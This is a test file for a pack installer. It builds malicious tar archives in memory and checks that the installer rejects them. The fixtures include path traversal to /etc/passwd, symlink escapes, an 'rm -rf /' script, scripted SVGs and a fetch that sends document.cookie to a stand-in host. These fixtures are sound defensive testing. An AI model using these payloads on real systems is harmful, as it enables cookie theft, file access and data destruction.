/**
 * Installer safety: malicious archive fixtures are built in memory (traversal, absolute paths,
 * symlinks, hard links, devices, bombs, bad hashes, scripted SVGs, networked html, engine mismatch).
 */
import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { gzipSync } from "node:zlib";
import { compilePackDir } from "../src/packs/compile";
import { PackStore } from "../src/packs/store";
import { buildLmpack, manifestText, packTar, readLmpack, sha256Hex, UnsafeArchiveError } from "../src/registry/archive";
import { InstallError, installLocalFile } from "../src/registry/client";
import { FIXTURE_DIR, tempHome } from "./helpers";

const enc = new TextEncoder();

async function fixtureFiles(): Promise<Map<string, Uint8Array>> {
  return PackStore.filesFromSource(await compilePackDir(FIXTURE_DIR), FIXTURE_DIR);
}

/** A raw tar entry with an arbitrary type flag and name (bypasses packTar's own checks). */
function rawEntry(name: string, type: string, data = new Uint8Array(0), linkname = ""): Uint8Array {
  const h = new Uint8Array(512);
  const put = (off: number, len: number, s: string) => h.set(enc.encode(s).subarray(0, len), off);
  const oct = (off: number, len: number, n: number) => put(off, len, `${n.toString(8).padStart(len - 1, "0")}\0`);
  put(0, 100, name);
  oct(100, 8, 0o644);
  oct(108, 8, 0);
  oct(116, 8, 0);
  oct(124, 12, data.byteLength);
  oct(136, 12, 0);
  h.fill(0x20, 148, 156);
  put(156, 1, type);
  put(157, 100, linkname);
  put(257, 6, "ustar\0");
  put(263, 2, "00");
  let sum = 0;
  for (const b of h) sum += b;
  put(148, 8, `${sum.toString(8).padStart(6, "0")}\0 `);
  const pad = new Uint8Array((512 - (data.byteLength % 512)) % 512);
  const out = new Uint8Array(512 + data.byteLength + pad.byteLength);
  out.set(h);
  out.set(data, 512);
  return out;
}

function tarOf(...parts: Uint8Array[]): Uint8Array {
  const total = parts.reduce((n, p) => n + p.byteLength, 0) + 1024;
  const out = new Uint8Array(total);
  let off = 0;
  for (const p of parts) {
    out.set(p, off);
    off += p.byteLength;
  }
  return out;
}

const gz = (b: Uint8Array) => new Uint8Array(gzipSync(b));

describe(".lmpack archives", () => {
  test("round-trip: build is deterministic and readLmpack verifies the manifest", async () => {
    const files = await fixtureFiles();
    const entries = [...files].map(([path, data]) => ({ path, data }));
    const a = buildLmpack(entries);
    const b = buildLmpack([...entries].reverse());
    expect(sha256Hex(a)).toBe(sha256Hex(b));
    const back = readLmpack(a);
    expect(back.has("MANIFEST.sha256")).toBe(true);
    expect(new TextDecoder().decode(back.get("pack.json"))).toBe(new TextDecoder().decode(files.get("pack.json")));
    expect(back.get("assets/img/clock-and-road.svg")).toBeDefined();
  });

  const reject = (name: string, tar: Uint8Array, match: RegExp) =>
    test(`rejects ${name}`, () => {
      expect(() => readLmpack(gz(tar))).toThrow(UnsafeArchiveError);
      expect(() => readLmpack(gz(tar))).toThrow(match);
    });

  reject("path traversal", tarOf(rawEntry("../../evil.txt", "0", enc.encode("x"))), /unsafe path/);
  reject("nested traversal", tarOf(rawEntry("assets/../../x.svg", "0", enc.encode("x"))), /unsafe path/);
  reject("absolute paths", tarOf(rawEntry("/etc/passwd", "0", enc.encode("x"))), /absolute/);
  reject("backslashes", tarOf(rawEntry("assets\\img\\x.svg", "0", enc.encode("x"))), /backslash/);
  reject("symlinks", tarOf(rawEntry("assets/img/link.svg", "2", new Uint8Array(0), "/etc/passwd")), /symlink/);
  reject("hard links", tarOf(rawEntry("assets/img/link.svg", "1", new Uint8Array(0), "pack.json")), /hard link/);
  reject("character devices", tarOf(rawEntry("assets/img/dev.svg", "3")), /device/);
  reject("FIFOs", tarOf(rawEntry("assets/img/fifo.svg", "6")), /device|FIFO/);
  reject("pax headers", tarOf(rawEntry("PaxHeader", "x", enc.encode("30 path=../../../../etc/passwd\n"))), /extended/);
  reject("files off the allowlist", tarOf(rawEntry("run.sh", "0", enc.encode("rm -rf /"))), /allowlist/);
  reject("scripts in assets", tarOf(rawEntry("assets/evil.js", "0", enc.encode("x"))), /allowlist/);
  reject(
    "html outside assets/interactive",
    tarOf(rawEntry("assets/img/page.html", "0", enc.encode("<p>x</p>"))),
    /allowlist/,
  );

  test("rejects a decompression bomb (ratio cap)", () => {
    const tar = tarOf(rawEntry("assets/audio/big.ogg", "0", new Uint8Array(8 * 1024 * 1024)));
    expect(() => readLmpack(gz(tar))).toThrow(/decompresses beyond/);
  });

  test("rejects archives over the unpacked size limit", () => {
    const tar = tarOf(rawEntry("assets/audio/a.ogg", "0", crypto.getRandomValues(new Uint8Array(60_000))));
    expect(() =>
      readLmpack(gz(tar), { maxEntries: 5000, maxUnpackedBytes: 50_000, maxRatio: 200, maxFileBytes: 1_000_000 }),
    ).toThrow(UnsafeArchiveError);
  });

  test("rejects too many entries", () => {
    const parts = Array.from({ length: 12 }, (_, i) => rawEntry(`assets/img/a${i}.png`, "0", enc.encode("x")));
    expect(() =>
      readLmpack(gz(tarOf(...parts)), { maxEntries: 10, maxUnpackedBytes: 1e9, maxRatio: 1e6, maxFileBytes: 1e9 }),
    ).toThrow(/more than 10 entries/);
  });

  test("rejects a file that doesn't match MANIFEST.sha256", async () => {
    const files = await fixtureFiles();
    const entries = [...files].map(([path, data]) => ({ path, data }));
    const manifest = manifestText(entries);
    const tampered = entries.map((e) => (e.path === "README.md" ? { path: e.path, data: enc.encode("tampered") } : e));
    const tar = packTar([...tampered, { path: "MANIFEST.sha256", data: enc.encode(manifest) }]);
    expect(() => readLmpack(gz(tar))).toThrow(/does not match MANIFEST/);
  });

  test("rejects an unlisted extra file", async () => {
    const files = await fixtureFiles();
    const entries = [...files].map(([path, data]) => ({ path, data }));
    const manifest = manifestText(entries);
    const tar = packTar([
      ...entries,
      { path: "assets/img/extra.png", data: enc.encode("x") },
      { path: "MANIFEST.sha256", data: enc.encode(manifest) },
    ]);
    expect(() => readLmpack(gz(tar))).toThrow(/not listed/);
  });
});

describe("installing", () => {
  const writeArchive = (home: string, entries: { path: string; data: Uint8Array }[]) => {
    const file = join(home, "x.lmpack");
    writeFileSync(file, buildLmpack(entries));
    return file;
  };

  test("a valid local archive installs atomically and becomes active", async () => {
    const home = tempHome();
    const store = new PackStore({ home });
    const files = await fixtureFiles();
    const file = writeArchive(
      home,
      [...files].map(([path, data]) => ({ path, data })),
    );
    const pack = installLocalFile(store, file);
    expect(pack.manifest.id).toBe("mini-pack");
    expect(store.readInstalled().packs["mini-pack"]?.active).toBe("0.1.0");
    expect(store.readInstalled().packs["mini-pack"]?.versions["0.1.0"]?.source).toBe("file");
    expect(existsSync(join(home, "packs", "mini-pack@0.1.0", "pack.json"))).toBe(true);
    expect(readdirSync(join(home, ".staging"))).toEqual([]);
  });

  const failing = async (
    mutate: (files: Map<string, Uint8Array>) => void,
    code: InstallError["code"],
    match: RegExp,
  ) => {
    const home = tempHome();
    const store = new PackStore({ home });
    const files = await fixtureFiles();
    mutate(files);
    const file = writeArchive(
      home,
      [...files].map(([path, data]) => ({ path, data })),
    );
    let err: unknown;
    try {
      installLocalFile(store, file);
    } catch (e) {
      err = e;
    }
    expect(err).toBeInstanceOf(InstallError);
    expect((err as InstallError).code).toBe(code);
    expect((err as Error).message).toMatch(match);
    expect(store.readInstalled().packs).toEqual({});
    expect(existsSync(join(home, "packs", "mini-pack@0.1.0"))).toBe(false);
  };

  test("a scripted SVG is refused", () =>
    failing(
      (f) =>
        f.set(
          "assets/img/clock-and-road.svg",
          enc.encode('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
        ),
      "unsafe_asset",
      /script/,
    ));

  test("an SVG with an event handler is refused", () =>
    failing(
      (f) =>
        f.set("assets/img/x.svg", enc.encode('<svg xmlns="http://www.w3.org/2000/svg"><rect onclick="x()"/></svg>')),
      "unsafe_asset",
      /event handler/,
    ));

  test("an SVG whose CSS hides an import behind escapes is refused", () =>
    failing(
      (f) =>
        f.set(
          "assets/img/x.svg",
          enc.encode(
            '<svg xmlns="http://www.w3.org/2000/svg"><style>@\\69mport "https://e.x/a.css";</style><rect/></svg>',
          ),
        ),
      "unsafe_asset",
      /CSS escape/,
    ));

  test("an SVG with an external reference is refused", () =>
    failing(
      (f) =>
        f.set(
          "assets/img/x.svg",
          enc.encode('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://e.x/t.png"/></svg>'),
        ),
      "unsafe_asset",
      /external reference/,
    ));

  test("an html interactive that uses the network is refused", () =>
    failing(
      (f) => f.set("assets/interactive/toy.html", enc.encode("<script>fetch('https://e.x/'+document.cookie)</script>")),
      "unsafe_asset",
      /fetch/,
    ));

  test("a pack for another engine is refused", () =>
    failing(
      (f) => {
        const pack = JSON.parse(new TextDecoder().decode(f.get("pack.json")));
        pack.manifest.engine = ">=9.0.0";
        f.set("pack.json", enc.encode(JSON.stringify(pack)));
      },
      "engine",
      /needs learncroc/,
    ));

  test("an invalid pack.json is refused", () =>
    failing((f) => f.set("pack.json", enc.encode('{"format":1}')), "invalid_pack", /pack.json/));
});

describe("assets", () => {
  test("a symlink inside an installed pack can't escape the pack root", async () => {
    const home = tempHome();
    const store = new PackStore({ home });
    const files = await fixtureFiles();
    store.install(files, { source: "file", tier: "local" });
    const secret = join(home, "secret.svg");
    writeFileSync(secret, '<svg xmlns="http://www.w3.org/2000/svg"/>');
    const dir = join(home, "packs", "mini-pack@0.1.0", "assets", "img");
    mkdirSync(dir, { recursive: true });
    symlinkSync(secret, join(dir, "escape.svg"));
    expect(await store.assetFile("mini-pack", "assets/img/escape.svg")).toBeNull();
    expect(await store.assetFile("mini-pack", "assets/../../secret.svg")).toBeNull();
    expect(await store.assetFile("mini-pack", "assets/img/clock-and-road.svg")).toContain("clock-and-road.svg");
    expect(
      readFileSync((await store.assetFile("mini-pack", "assets/img/clock-and-road.svg")) as string, "utf8"),
    ).toContain("<svg");
  });
});
